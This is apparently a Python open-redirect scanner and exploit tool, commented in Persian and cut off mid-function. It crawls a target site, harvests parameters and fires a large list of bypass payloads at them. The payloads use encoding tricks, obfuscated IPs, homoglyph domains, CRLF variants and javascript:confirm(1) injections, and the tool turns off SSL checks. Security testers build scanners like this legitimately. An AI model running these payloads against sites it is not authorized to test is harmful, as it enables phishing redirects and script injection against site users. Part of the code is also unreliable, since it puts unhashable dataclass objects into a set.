#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔍 Professional Open Redirect Vulnerability Scanner
برنامه حرفه‌ای پیدا کردن و اکسپلویت باگ Open Redirect

نویسنده: Security Research Team
نسخه: 2.0 Professional

ویژگی‌ها:
✅ خزش عمیق با رندر JavaScript
✅ تحلیل پیشرفته فایل‌های JS
✅ تشخیص DOM-based redirect  
✅ پشتیبانی کامل Web3
✅ تزریق payload هوشمند بر اساس context
✅ عکس‌برداری خودکار PoC
✅ گزارش‌دهی حرفه‌ای

استفاده:
python3 open_redirect_pro.py https://target.com
"""

import asyncio
import aiohttp
import re
import json
import time
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs, unquote, quote
from dataclasses import dataclass, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from pathlib import Path
import logging
import argparse
from datetime import datetime
import hashlib
import base64
import random
import string
import os
import sys
import tempfile
import csv

# Try importing optional dependencies
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException, WebDriverException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    print("⚠️  Selenium not available - screenshots will be disabled")

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False
    print("⚠️  BeautifulSoup not available - using basic HTML parsing")

try:
    import esprima
    import jsbeautifier
    JS_ANALYSIS_AVAILABLE = True
except ImportError:
    JS_ANALYSIS_AVAILABLE = False
    print("⚠️  JavaScript analysis libraries not available - using regex only")


@dataclass
class Parameter:
    """پارامتر کشف شده"""
    name: str
    value: str
    source: str  # 'url', 'form', 'javascript', 'headers', 'web3'
    context: str  # 'query', 'fragment', 'form', 'js_variable', 'web3_config'
    url: str
    method: str = 'GET'
    is_redirect_related: bool = False
    confidence: float = 0.0


@dataclass
class Vulnerability:
    """آسیب‌پذیری کشف شده"""
    url: str
    parameter: str
    payload: str
    method: str
    response_code: int
    redirect_url: str
    context: str
    screenshot_path: Optional[str] = None
    timestamp: str = ""
    vulnerability_type: str = "open_redirect"
    confidence: float = 0.0
    impact: str = "MEDIUM"
    remediation: str = ""


class OpenRedirectPro:
    """اسکنر حرفه‌ای Open Redirect"""
    
    def __init__(self, target_url: str, max_depth: int = 3, max_pages: int = 100):
        self.target_url = target_url.rstrip('/')
        self.base_domain = urlparse(target_url).netloc
        self.max_depth = max_depth
        self.max_pages = max_pages
        
        # ذخیره‌سازی
        self.discovered_urls: Set[str] = set()
        self.parameters: List[Parameter] = []
        self.vulnerabilities: List[Vulnerability] = []
        self.js_files: Set[str] = set()
        
        # مدیریت session
        self.session: Optional[aiohttp.ClientSession] = None
        self.driver: Optional[webdriver.Chrome] = None
        
        # تنظیمات
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]
        
        # راه‌اندازی logging
        self.setup_logging()
        
        # بارگذاری payloadها
        self.payloads = self.load_all_payloads()
        
        # الگوهای redirect
        self.redirect_patterns = [
            r'redirect', r'url', r'next', r'return', r'goto', r'target',
            r'destination', r'continue', r'forward', r'redir', r'location',
            r'site', r'link', r'href', r'returnurl', r'returnto', r'back',
            r'callback', r'success', r'failure', r'done', r'exit', r'referrer'
        ]
        
        # الگوهای Web3
        self.web3_patterns = [
            r'web3', r'ethereum', r'metamask', r'wallet', r'dapp',
            r'blockchain', r'crypto', r'nft', r'defi', r'contract'
        ]
    
    def setup_logging(self):
        """راه‌اندازی logging"""
        log_format = '%(asctime)s - %(levelname)s - %(message)s'
        
        logging.basicConfig(
            level=logging.INFO,
            format=log_format,
            handlers=[
                logging.FileHandler('open_redirect_scan.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def load_all_payloads(self) -> List[str]:
        """بارگذاری تمام payloadهای اختصاصی شما"""
        return [
            "/%09/google.com",
            "/%2f%2fgoogle.com",
            "/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/",
            "/%5cgoogle.com",
            "/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "/.google.com",
            "//%09/google.com",
            "//%5cgoogle.com",
            "///%09/google.com",
            "///%5cgoogle.com",
            "////%09/google.com",
            "////%5cgoogle.com",
            "/////google.com",
            "/////google.com/",
            "////google.com/",
            "////google.com/%2e%2e",
            "////google.com/%2e%2e%2f",
            "////google.com/%2f%2e%2e",
            "////google.com/%2f..",
            "////google.com//",
            "///google.com",
            "///google.com/",
            "//google.com/%2f..",
            "///google.com/%2f..",
            "https://google.com/%2f..",
            "//www.google.com/%2f%2e%2e",
            "///www.google.com/%2f%2e%2e",
            "////www.google.com/%2f%2e%2e",
            "https://www.google.com/%2f%2e%2e",
            "//google.com/",
            "https://google.com/",
            "//google.com//",
            "///google.com//",
            "https://google.com//",
            "//www.google.com/%2e%2e%2f",
            "///www.google.com/%2e%2e%2f",
            "////www.google.com/%2e%2e%2f",
            "https://www.google.com/%2e%2e%2f",
            "///www.google.com/%2e%2e",
            "////www.google.com/%2e%2e",
            "https:///www.google.com/%2e%2e",
            "/https://www.google.com/%2e%2e",
            "https:///www.google.com/%2f%2e%2e",
            "https://%09/google.com",
            "https:google.com",
            "//google%E3%80%82com",
            "\\/\\/google.com/",
            "/\\/google.com/",
            "http://0xd8.0x3a.0xd6.0xce",
            "〱google.com",
            "〵google.com",
            "ゝgoogle.com",
            "ーgoogle.com",
            "ｰgoogle.com",
            "/〱google.com",
            "/〵google.com",
            "/ゝgoogle.com",
            "/ーgoogle.com",
            "/ｰgoogle.com",
            "%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "http://%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "///google.com/%2e%2e",
            "///google.com/%2e%2e%2f",
            "///google.com/%2f%2e%2e",
            "//google.com",
            "//google.com/%2e%2e",
            "//google.com/%2e%2e%2f",
            "//google.com/%2f%2e%2e",
            "//https:///google.com/%2e%2e",
            "//https://google.com/%2e%2e%2f",
            "/&lt;&gt;//google.com",
            "/?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com",
            "/?url=/\\/google.com&next=/\\/google.com&redirect=/\\/google.com&redirect_uri=/\\/google.com",
            "/?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://google.com&rurl=Https://google.com&redirect_uri=Https://google.com&lt;br/&gt;/\\/\\/google.com/",
            "/google.com/%2f%2e%2e",
            "/http://google.com",
            "/http:/google.com",
            "/https:/%5cgoogle.com/",
            "/https://%5cgoogle.com",
            "/https://google.com/%2e%2e",
            "/https://google.com/%2f%2e%2e",
            "/https:google.com",
            "/redirect?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com",
            "/redirect?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://example.com&rurl=Https://google.com&redirect_uri=Https://google.com",
            "//%2fxgoogle.com",
            "//localdomain%E3%80%82pw",
            "http://0xd83ad6ce",
            "http://3627734734",
            "http://472.314.470.462",
            "http://0330.072.0326.0316",
            "http://00330.00072.0000326.00000316",
            "http://0xd8.072.54990",
            "http://0xd8.3856078",
            "http://00330.3856078",
            "http://00330.0x3a.54990",
            "http:0xd8.0x3a.0xd6.0xce",
            "http:0xd83ad6ce",
            "http:3627734734",
            "http:472.314.470.462",
            "http:0330.072.0326.0316",
            "http:00330.00072.0000326.00000316",
            "http:[::216.58.214.206]",
            "http:[::ffff:216.58.214.206]",
            "http:0xd8.072.54990",
            "http:0xd8.3856078",
            "http:00330.3856078",
            "http:00330.0x3a.54990",
            "&lt;&gt;//google.com",
            "http://.google.com",
            "https://google.com/https://google.com/",
            "http://google.com\tgoogle.com/",
            "//google.com\tgoogle.com/",
            "http://google.com%2f%2f.google.com/",
            "http://google.com%5c%5c.google.com/",
            "http://google.com%3F.google.com/",
            "http://google.com%23.google.com/",
            "http://google.com:80%40google.com/",
            "http://google.com%2egoogle.com/",
            "/〱ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "〱ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "$2f%2f216.58.214.206%2f%2f",
            "$2f%2f3627734734%2f%2f",
            "$2f%2fgoogle.com",
            "$2f%2fgoogle.com%2f%2f",
            "%01https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "/%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "//%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "///%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "////%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "////216.58.214.206",
            "///216.58.214.206",
            "//216.58.214.206",
            "/\\216.58.214.206",
            "/216.58.214.206",
            "216.58.214.206",
            "%2f$2f216.58.214.206",
            "%2f$2f3627734734",
            "%2f$2fgoogle.com",
            "%2f216.58.214.206",
            "%2f216.58.214.206//",
            "%2f216.58.214.206%2f%2f",
            "//%2f%2fgoogle.com",
            "/%2f%2fⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "//%2f%2fⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "%2f3627734734",
            "%2f3627734734//",
            "%2f3627734734%2f%2f",
            "/%2f%5c%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77/",
            "%2fgoogle.com",
            "%2fgoogle.com//",
            "\\\\google.com",
            "%2fgoogle.com%2f%2f",
            "////3627734734",
            "///3627734734",
            "//3627734734",
            "/\\3627734734",
            "/3627734734",
            "//%2F/google.com",
            "/%0D/google.com",
            "/%2F/google.com",
            "/%5Cgoogle.com",
            "/%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "//%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "///%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "////%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "/\\google%252ecom",
            "google%252ecom",
            "../google.com",
            "//google%00.com",
            "////google.com",
            "//\\/google.com/",
            "//\\google.com",
            "/<>//google.com",
            "/\\/\\/google.com/",
            "/\\/google.com",
            "/\\google.com",
            "/google.com",
            "//google.com/%2E%2E",
            "//google.com/%2F..",
            "/google.com/%2F..",
            "//google.com//%2F%2E%2E",
            "google.com/.jpg",
            "http:%0a%0dgoogle.com",
            "http:%0a%0dⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "http:/\\/\\google.com",
            "http:/google.com",
            "http:google.com",
            "/http:/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "http://.ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "http:/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "http:ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "https://%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "https://%0a%0dgoogle.com",
            "https://%0a%0dⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "https%3a%2f%2fgoogle.com%2f",
            "https:/%5cgoogle.com/",
            "/https:/%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "/https://%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "https:/%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "https://%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77",
            "https:/\\google.com",
            "https://google%E3%80%82com",
            "//https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂//",
            "/https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "https:ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "//https:///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e",
            "/https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e",
            "//https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e%2f",
            "/https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f..",
            "/https:///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
            "/https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
            "javascript:confirm(1)",
            "javascript:prompt(1)",
            "//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ%00｡Ｐⓦ",
            "//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ%E3%80%82pw",
            "/.ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "/////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "/////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂//",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂//",
            "//\\/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂//",
            "/\\/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "<>//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "\\/\\/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e",
            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e%2f",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e%2f",
            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e%2f",
            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f..",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f..",
            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f..",
            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
            # Web3 specific payloads
            "//metamask.io",
            "//wallet.connect",
            "//uniswap.org",
            "//opensea.io",
            "web3://contract.eth",
            "ipfs://QmHash",
            "ens://vitalik.eth"
        ]
    
    async def init_session(self):
        """راه‌اندازی HTTP session"""
        timeout = aiohttp.ClientTimeout(total=30)
        connector = aiohttp.TCPConnector(limit=50, limit_per_host=10, ssl=False)
        
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers={
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive'
            }
        )
    
    def init_driver(self):
        """راه‌اندازی Chrome WebDriver"""
        if not SELENIUM_AVAILABLE:
            self.logger.warning("Selenium not available - screenshots disabled")
            return
        
        try:
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--ignore-certificate-errors')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.logger.info("Chrome WebDriver initialized")
        except Exception as e:
            self.logger.warning(f"Chrome WebDriver failed: {e}")
            self.driver = None
    
    async def crawl_website(self) -> Set[str]:
        """خزش عمیق وب‌سایت"""
        self.logger.info(f"🕷️ Starting deep crawl of {self.target_url}")
        
        urls_to_crawl = {self.target_url}
        crawled_urls = set()
        depth = 0
        
        while urls_to_crawl and depth < self.max_depth and len(crawled_urls) < self.max_pages:
            current_urls = list(urls_to_crawl)[:20]  # Batch processing
            urls_to_crawl.clear()
            
            tasks = []
            for url in current_urls:
                if url not in crawled_urls:
                    tasks.append(self.crawl_single_page(url))
            
            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if isinstance(result, Exception):
                        continue
                    
                    if result:
                        url, new_urls, params = result
                        crawled_urls.add(url)
                        self.parameters.extend(params)
                        
                        for new_url in new_urls:
                            if self.is_same_domain(new_url) and new_url not in crawled_urls:
                                urls_to_crawl.add(new_url)
            
            depth += 1
            self.logger.info(f"Depth {depth}: {len(crawled_urls)} URLs, {len(self.parameters)} parameters")
        
        self.discovered_urls = crawled_urls
        return crawled_urls
    
    async def crawl_single_page(self, url: str) -> Optional[Tuple[str, Set[str], List[Parameter]]]:
        """خزش یک صفحه"""
        try:
            async with self.session.get(url, allow_redirects=False) as response:
                content = await response.text()
                
                # Parse HTML
                if BS4_AVAILABLE:
                    soup = BeautifulSoup(content, 'html.parser')
                    new_urls = self.extract_urls_bs4(soup, url)
                    params = self.extract_params_bs4(soup, url)
                else:
                    new_urls = self.extract_urls_regex(content, url)
                    params = self.extract_params_regex(content, url)
                
                # URL parameters
                params.extend(self.extract_url_parameters(url))
                
                # JavaScript analysis
                js_params = await self.analyze_javascript_content(content, url)
                params.extend(js_params)
                
                # Web3 analysis
                web3_params = self.analyze_web3_patterns(content, url)
                params.extend(web3_params)
                
                return url, new_urls, params
                
        except Exception as e:
            self.logger.debug(f"Error crawling {url}: {e}")
            return None
    
    def extract_urls_bs4(self, soup, base_url: str) -> Set[str]:
        """استخراج URL با BeautifulSoup"""
        urls = set()
        for link in soup.find_all(['a', 'link'], href=True):
            href = link['href']
            full_url = urljoin(base_url, href)
            if self.is_same_domain(full_url):
                urls.add(full_url)
        return urls
    
    def extract_urls_regex(self, content: str, base_url: str) -> Set[str]:
        """استخراج URL با regex"""
        urls = set()
        url_patterns = [
            r'href=["\']([^"\']+)["\']',
            r'src=["\']([^"\']+)["\']',
            r'action=["\']([^"\']+)["\']'
        ]
        
        for pattern in url_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                full_url = urljoin(base_url, match)
                if self.is_same_domain(full_url):
                    urls.add(full_url)
        
        return urls
    
    def extract_params_bs4(self, soup, url: str) -> List[Parameter]:
        """استخراج پارامترها با BeautifulSoup"""
        params = []
        
        # Form parameters
        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            form_url = urljoin(url, action) if action else url
            
            for input_tag in form.find_all(['input', 'select', 'textarea']):
                name = input_tag.get('name')
                value = input_tag.get('value', '')
                
                if name:
                    is_redirect = self.is_redirect_parameter(name, value)
                    confidence = self.calculate_confidence(name, value, 'form')
                    
                    params.append(Parameter(
                        name=name,
                        value=value,
                        source='form',
                        context='form_input',
                        url=form_url,
                        method=method,
                        is_redirect_related=is_redirect,
                        confidence=confidence
                    ))
        
        return params
    
    def extract_params_regex(self, content: str, url: str) -> List[Parameter]:
        """استخراج پارامترها با regex"""
        params = []
        
        # Form patterns
        form_patterns = [
            r'<input[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
            r'<input[^>]*value=["\']([^"\']*)["\'][^>]*name=["\']([^"\']+)["\']'
        ]
        
        for pattern in form_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if len(match) == 2:
                    name, value = match if 'name=' in pattern.split('value=')[0] else (match[1], match[0])
                    is_redirect = self.is_redirect_parameter(name, value)
                    confidence = self.calculate_confidence(name, value, 'form')
                    
                    params.append(Parameter(
                        name=name,
                        value=value,
                        source='form',
                        context='form_input',
                        url=url,
                        is_redirect_related=is_redirect,
                        confidence=confidence
                    ))
        
        return params
    
    def extract_url_parameters(self, url: str) -> List[Parameter]:
        """استخراج پارامترهای URL"""
        params = []
        parsed = urlparse(url)
        
        # Query parameters
        query_params = parse_qs(parsed.query, keep_blank_values=True)
        for param_name, param_values in query_params.items():
            for value in param_values:
                is_redirect = self.is_redirect_parameter(param_name, value)
                confidence = self.calculate_confidence(param_name, value, 'query')
                
                params.append(Parameter(
                    name=param_name,
                    value=value,
                    source='url',
                    context='query',
                    url=url,
                    is_redirect_related=is_redirect,
                    confidence=confidence
                ))
        
        # Fragment parameters
        if parsed.fragment:
            if '=' in parsed.fragment:
                fragment_params = parse_qs(parsed.fragment, keep_blank_values=True)
                for param_name, param_values in fragment_params.items():
                    for value in param_values:
                        is_redirect = self.is_redirect_parameter(param_name, value)
                        confidence = self.calculate_confidence(param_name, value, 'fragment')
                        
                        params.append(Parameter(
                            name=param_name,
                            value=value,
                            source='url',
                            context='fragment',
                            url=url,
                            is_redirect_related=is_redirect,
                            confidence=confidence
                        ))
        
        return params
    
    async def analyze_javascript_content(self, content: str, url: str) -> List[Parameter]:
        """تحلیل محتوای JavaScript"""
        params = []
        
        # Extract JavaScript code
        js_blocks = []
        
        # Inline JavaScript
        if BS4_AVAILABLE:
            soup = BeautifulSoup(content, 'html.parser')
            for script in soup.find_all('script'):
                if script.string:
                    js_blocks.append(script.string)
                elif script.get('src'):
                    js_url = urljoin(url, script['src'])
                    if self.is_same_domain(js_url):
                        self.js_files.add(js_url)
                        js_content = await self.fetch_js_file(js_url)
                        if js_content:
                            js_blocks.append(js_content)
        else:
            # Regex-based extraction
            script_pattern = r'<script[^>]*>(.*?)</script>'
            scripts = re.findall(script_pattern, content, re.DOTALL | re.IGNORECASE)
            js_blocks.extend(scripts)
        
        # Analyze each JavaScript block
        for js_content in js_blocks:
            js_params = self.analyze_javascript_code(js_content, url)
            params.extend(js_params)
        
        return params
    
    async def fetch_js_file(self, js_url: str) -> Optional[str]:
        """دریافت فایل JavaScript"""
        try:
            async with self.session.get(js_url) as response:
                return await response.text()
        except:
            return None
    
    def analyze_javascript_code(self, js_content: str, source_url: str) -> List[Parameter]:
        """تحلیل کد JavaScript"""
        params = []
        
        # Beautify if possible
        if JS_ANALYSIS_AVAILABLE:
            try:
                js_content = jsbeautifier.beautify(js_content)
            except:
                pass
        
        # JavaScript parameter patterns
        js_patterns = [
            r'location\.href\s*=\s*([^;]+)',
            r'window\.location\s*=\s*([^;]+)',
            r'document\.location\s*=\s*([^;]+)',
            r'location\.assign\(["\']?([^"\';\)]+)',
            r'location\.replace\(["\']?([^"\';\)]+)',
            r'window\.open\(["\']?([^"\';\,\)]+)',
            r'new\s+URLSearchParams\([^)]*\)\.get\(["\']([^"\']+)["\']',
            r'localStorage\.getItem\(["\']([^"\']+)["\']',
            r'sessionStorage\.getItem\(["\']([^"\']+)["\']',
            r'([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*["\']([^"\']*)["\']',
        ]
        
        lines = js_content.split('\n')
        for line_num, line in enumerate(lines, 1):
            for pattern in js_patterns:
                matches = re.finditer(pattern, line, re.IGNORECASE)
                for match in matches:
                    groups = match.groups()
                    if groups:
                        if len(groups) == 1:
                            param_name = f"js_param_{line_num}"
                            param_value = groups[0]
                        else:
                            param_name = groups[0] if groups[0] else f"js_param_{line_num}"
                            param_value = groups[1] if len(groups) > 1 else groups[0]
                        
                        is_redirect = self.is_redirect_parameter(param_name, param_value)
                        confidence = self.calculate_confidence(param_name, param_value, 'javascript')
                        
                        # Boost confidence for redirect patterns
                        if any(sink in line.lower() for sink in ['location.href', 'window.location']):
                            is_redirect = True
                            confidence += 0.3
                        
                        params.append(Parameter(
                            name=param_name.strip('"\''),
                            value=param_value.strip('"\''),
                            source='javascript',
                            context='js_variable',
                            url=source_url,
                            is_redirect_related=is_redirect,
                            confidence=min(confidence, 1.0)
                        ))
        
        return params
    
    def analyze_web3_patterns(self, content: str, url: str) -> List[Parameter]:
        """تحلیل الگوهای Web3"""
        params = []
        
        # Check if Web3 application
        if not any(pattern in content.lower() for pattern in self.web3_patterns):
            return params
        
        self.logger.info(f"🌐 Detected Web3 application at {url}")
        
        # Web3 parameter patterns
        web3_patterns = [
            r'contract\s*:\s*["\']([^"\']+)["\']',
            r'address\s*:\s*["\']([^"\']+)["\']',
            r'chainId\s*:\s*["\']?([^"\']+)["\']?',
            r'provider\s*:\s*["\']([^"\']+)["\']',
            r'wallet\s*:\s*["\']([^"\']+)["\']',
            r'network\s*:\s*["\']([^"\']+)["\']',
        ]
        
        for pattern in web3_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                param_name = f"web3_{pattern.split(':')[0].strip()}"
                param_value = match
                
                params.append(Parameter(
                    name=param_name,
                    value=param_value,
                    source='web3',
                    context='web3_config',
                    url=url,
                    is_redirect_related=True,
                    confidence=0.7
                ))
        
        return params
    
    def is_same_domain(self, url: str) -> bool:
        """بررسی تعلق URL به همان domain"""
        try:
            parsed = urlparse(url)
            target_domain = parsed.netloc.lower()
            base_domain = self.base_domain.lower()
            
            return (target_domain == base_domain or 
                   target_domain.endswith(f'.{base_domain}') or
                   (target_domain.startswith('www.') and target_domain[4:] == base_domain))
        except:
            return False
    
    def is_redirect_parameter(self, param_name: str, param_value: str = "") -> bool:
        """تشخیص پارامتر redirect"""
        param_lower = param_name.lower()
        value_lower = param_value.lower()
        
        # Check parameter name
        name_match = any(pattern in param_lower for pattern in self.redirect_patterns)
        
        # Check parameter value for URL patterns
        value_match = bool(re.match(r'https?://', value_lower) or 
                          re.match(r'//', value_lower) or
                          ('.' in value_lower and len(value_lower) > 3))
        
        return name_match or value_match
    
    def calculate_confidence(self, param_name: str, param_value: str, context: str) -> float:
        """محاسبه امتیاز اعتماد"""
        confidence = 0.0
        
        # Base confidence by context
        context_scores = {
            'query': 0.6, 'fragment': 0.7, 'form_input': 0.5,
            'javascript': 0.4, 'web3_config': 0.7
        }
        confidence += context_scores.get(context, 0.3)
        
        # Boost for redirect-related names
        if self.is_redirect_parameter(param_name):
            confidence += 0.3
        
        # Boost for URL-like values
        if param_value and (param_value.startswith(('http', '//', 'javascript:')) or 
                           '.' in param_value and len(param_value) > 5):
            confidence += 0.2
        
        return min(confidence, 1.0)
    
    def detect_context(self, param: Parameter) -> str:
        """تشخیص context پارامتر"""
        if param.source == 'web3':
            return 'web3'
        elif param.source == 'javascript':
            return 'javascript'
        elif param.context == 'fragment':
            return 'fragment'
        elif param.context == 'query':
            return 'query'
        elif param.context == 'form_input':
            return 'form'
        else:
            return 'generic'
    
    def get_context_payloads(self, context: str) -> List[str]:
        """انتخاب payload بر اساس context"""
        if context == 'javascript':
            return [
                "javascript:confirm(1)",
                "javascript:prompt(1)",
                "//google.com",
                "https://google.com"
            ]
        elif context == 'web3':
            return [
                "//metamask.io",
                "//wallet.connect",
                "//uniswap.org",
                "web3://contract.eth",
                "//google.com"
            ]
        elif context == 'fragment':
            return [
                "//google.com",
                "https://google.com",
                "javascript:confirm(1)"
            ]
        else:
            # Default payloads for query, form, etc.
            return self.payloads[:20]  # First 20 payloads
    
    async def test_vulnerabilities(self) -> List[Vulnerability]:
        """تست آسیب‌پذیری‌ها"""
        self.logger.info("🎯 Starting vulnerability testing")
        
        vulnerabilities = []
        
        # Sort parameters by priority
        redirect_params = [p for p in self.parameters if p.is_redirect_related]
        high_conf_params = [p for p in self.parameters if p.confidence > 0.6]
        
        # Combine and deduplicate
        priority_params = list(set(redirect_params + high_conf_params))
        
        self.logger.info(f"Testing {len(priority_params)} priority parameters")
        
        for param in priority_params:
            context = self.detect_context(param)
            payloads = self.get_context_payloads(context)
            
            for payload in payloads:
                vuln = await self.test_parameter_with_payload(param, payload)
                if vuln:
                    vulnerabilities.append(vuln)
                    self.logger.info(f"🚨 Found vulnerability: {param.name} -> {payload}")
                
                await asyncio.sleep(0.1)  # Rate limiting
        
        # Test other parameters with limited payloads
        other_params = [p for p in self.parameters if p not in priority_params]
        basic_payloads = ["//google.com", "https://google.com", "javascript:confirm(1)"]
        
        for param in other_params[:30]:  # Limit to 30 other parameters
            for payload in basic_payloads:
                vuln = await self.test_parameter_with_payload(param, payload)
                if vuln:
                    vulnerabilities.append(vuln)
                
